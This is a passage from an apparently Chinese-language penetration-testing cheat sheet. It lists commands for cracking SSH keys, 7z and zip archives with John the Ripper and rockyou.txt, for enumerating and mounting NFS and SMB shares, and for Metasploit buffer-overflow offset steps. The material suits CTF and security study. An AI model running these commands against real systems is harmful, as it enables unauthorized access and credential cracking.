+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt id_rsa     
+</span></span></code></pre></div><p>破解 7z</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/john/7z2john.py backup.7z &gt; 7z_hash.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john 7z_hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>破解 zip</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/sbin/zip2john flag.zip &gt; flag.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john flag.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>生成更好的字典</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -rules -wordlist<span style="color:#f92672">=</span>password.txt - stdout | sort | uniq &gt; wordlist.txt
+</span></span></code></pre></div><h3 id="共享目录相关">共享目录相关</h3>
+<h4 id="mount">Mount</h4>
+<p>检查共享目录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>showmount -e 10.10.10.13
+</span></span></code></pre></div><p>连接共享目录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mount -t nfs 10.10.10.13:/home/karl attact
+</span></span></code></pre></div><h4 id="smbclient">Smbclient</h4>
+<p>列出 SMB 共享</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo smbclient -N -L <span style="color:#ae81ff">\\\\</span>10.10.10.10
+</span></span></code></pre></div><p>连接到 SMB 共享</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.10<span style="color:#ae81ff">\\</span>enil
+</span></span></code></pre></div><h3 id="缓冲区溢出">缓冲区溢出</h3>
+<h4 id="msf">Msf</h4>
+<p>创建 600 字节缓冲区</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_crate -l <span style="color:#ae81ff">600</span>
+</span></span></code></pre></div><p>确定字节</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_offset -l <span style="color:#ae81ff">600</span> -q <span style="color:#ae81ff">35724134</span>
+</span></span></code></pre></div><p>jum esp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-nasm_shell
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jmp esp
+</span></span></code></pre></div>]]></content>
         </item>
         
         <item>
